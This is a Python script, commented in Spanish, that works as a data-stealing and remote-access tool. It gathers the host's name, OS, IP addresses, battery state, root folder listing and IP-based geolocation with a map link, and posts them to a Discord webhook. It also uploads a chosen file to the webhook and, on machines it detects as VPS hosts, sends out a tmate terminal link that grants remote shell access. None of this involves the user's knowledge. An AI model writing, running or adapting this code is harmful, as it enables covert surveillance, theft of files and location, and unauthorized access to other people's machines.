import os
import requests
import socket
import platform
import psutil
import subprocess

WEBHOOK_URL = 'TU_WEBHOOK_URL_DE_DISCORD'  # Reemplaza con tu URL de webhook de Discord

# Función para obtener la IP privada
def get_private_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except:
        return "No disponible"

# Función para obtener la IP pública
def get_public_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except:
        return "No disponible"

# Función para obtener el estado de la batería
def get_battery_status():
    try:
        battery = psutil.sensors_battery()
        if battery:
            return f"{battery.percent}% {'(Cargando)' if battery.power_plugged else '(No cargando)'}"
        else:
            return "No disponible"
    except:
        return "Error"

# Función para obtener información básica del sistema
def get_system_info():
    return {
        'Dispositivo': platform.node(),
        'Sistema': platform.system(),
        'Versión': platform.version(),
        'Procesador': platform.processor()
    }

# Función para listar las carpetas principales del sistema
def list_main_folders():
    try:
        root_path = 'C:\\' if platform.system() == 'Windows' else '/'
        folders = [f for f in os.listdir(root_path) if os.path.isdir(os.path.join(root_path, f))]
        return folders[:20]
    except:
        return ["No disponible"]

# Función para obtener la ubicación del dispositivo utilizando IP-API
def get_location():
    try:
        response = requests.get('http://ip-api.com/json/')
        data = response.json()
        if data['status'] == 'success':
            lat = data['lat']
            lon = data['lon']
            location = f"{data['city']}, {data['regionName']}, {data['country']}"
            maps_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
            return location, maps_link
        else:
            return "No disponible", ""
    except:
        return "Error", ""

# Función para verificar si el dispositivo es un VPS
def es_vps():
    try:
        with open('/proc/cpuinfo', 'r') as f:
            cpuinfo = f.read()
            if 'hypervisor' in cpuinfo.lower():
                return True

        with open('/sys/class/dmi/id/product_name', 'r') as f:
            product_name = f.read().strip()
            if 'virtual' in product_name.lower():
                return True

        return False
    except Exception as e:
        print(f"Error al intentar detectar VPS: {e}")
        return False

# Función para iniciar tmate y obtener el enlace de la sesión
def iniciar_tmate():
    try:
        result = subprocess.run(['tmate', 'show-messages'], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if 'tmate session' in line:
                enlace_tmate = line.split(':')[1].strip()
                return enlace_tmate
        return None
    except Exception as e:
        print(f"Error al iniciar tmate: {e}")
        return None

# Función para enviar el reporte a Discord
def enviar_reporte():
    info = get_system_info()
    carpetas = list_main_folders()
    location, maps_link = get_location()

    mensaje = (
        f"**[REPORTE DEL DISPOSITIVO]**\n"
        f"**Nombre:** {info['Dispositivo']}\n"
        f"**Sistema Operativo:** {info['Sistema']} {info['Versión']}\n"
        f"**Procesador:** {info['Procesador']}\n"
        f"**IP Pública:** {get_public_ip()}\n"
        f"**IP Privada:** {get_private_ip()}\n"
        f"**Batería:** {get_battery_status()}\n"
        f"**Carpetas principales:**\n" + "\n".join(f"- {c}" for c in carpetas) + "\n"
        f"**Ubicación aproximada:** {location}\n"
        f"{maps_link}"
    )

    try:
        requests.post(WEBHOOK_URL, json={"content": mensaje})
    except Exception as e:
        print(f"Error al enviar el reporte: {e}")

# Función para enviar un archivo a Discord usando el webhook
def enviar_archivo_a_discord(archivo_path):
    try:
        if os.path.exists(archivo_path):
            with open(archivo_path, 'rb') as file:
                files = {'file': (os.path.basename(archivo_path), file)}
                response = requests.post(WEBHOOK_URL, files=files)
                if response.status_code == 200:
                    print(f"Archivo '{archivo_path}' enviado correctamente a Discord.")
                    # Discord proporciona un enlace al archivo subido en el mensaje de respuesta
                    print(f"Enlace para descargar el archivo: {response.json()['attachments'][0]['url']}")
                else:
                    print(f"Error al enviar archivo: {response.text}")
        else:
            print(f"El archivo {archivo_path} no existe.")
    except Exception as e:
        print(f"Ocurrió un error: {e}")

# Función para enviar enlace de tmate a Discord si es VPS
def enviar_enlace_tmate():
    if es_vps():
        print("Dispositivo detectado como VPS. Iniciando tmate...")
        enlace_tmate = iniciar_tmate()
        if enlace_tmate:
            mensaje = f"El dispositivo está en un VPS. Aquí está el enlace para acceder a la terminal de tmate: {enlace_tmate}"
            requests.post(WEBHOOK_URL, json={"content": mensaje})
            print("Enlace de tmate enviado a Discord.")
        else:
            print("No se pudo obtener el enlace de tmate.")
    else:
        print("Este dispositivo no es un VPS.")

# Función principal que combina todo
def ejecutar():
    # Enviar el reporte
    enviar_reporte()

    # Enviar archivo (Ejemplo de archivo que deseas enviar)
    enviar_archivo_a_discord('ruta/del/archivo.txt')  # Reemplaza con la ruta del archivo

    # Enviar el enlace de tmate si es VPS
    enviar_enlace_tmate()

# Ejecutar la función principal
if __name__ == '__main__':
    ejecutar()
